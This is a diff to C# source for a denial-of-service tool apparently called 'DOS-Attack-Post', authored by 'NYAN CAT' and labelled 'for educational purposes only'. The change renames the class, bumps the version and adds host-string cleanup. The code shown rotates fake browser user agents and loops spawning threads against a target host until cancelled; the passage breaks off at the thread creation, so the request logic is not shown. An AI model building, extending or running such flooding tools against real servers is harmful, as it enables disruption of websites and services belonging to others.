@@ -7,19 +7,19 @@ namespace DDoS_Post
 {
 
     //       │ Author     : NYAN CAT
-    //       │ Name       : DDoS Post v0.1
+    //       │ Name       : DOS-Attack-Post 0.2
     //       │ Contact    : https://github.com/NYAN-x-CAT
 
     //       This program is distributed for educational purposes only.
 
-    public class DdosPost
+    public class DosPost
     {
         private readonly string[] userAgents = { " Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0",
             "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1",
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"};
         public string Host { get; set; }
         public CancellationToken CancelToken { get; set; }
-        public DdosPost(string host, CancellationToken cancelToken)
+        public DosPost(string host, CancellationToken cancelToken)
         {
             Host = host;
             CancelToken = cancelToken;
@@ -30,6 +30,7 @@ namespace DDoS_Post
             if (Host.StartsWith("https://", true, CultureInfo.CurrentCulture)) Host = Host.Replace("https://", null);
             if (Host.StartsWith("http://", true, CultureInfo.CurrentCulture)) Host = Host.Replace("http://", null);
             if (Host.StartsWith("www.", true, CultureInfo.CurrentCulture)) Host = Host.Replace("www.", null);
+            if (Host.EndsWith("/", true, CultureInfo.CurrentCulture)) Host = Host.Replace("/", null);
             while (!CancelToken.IsCancellationRequested)
             {
                 new Thread(() =>
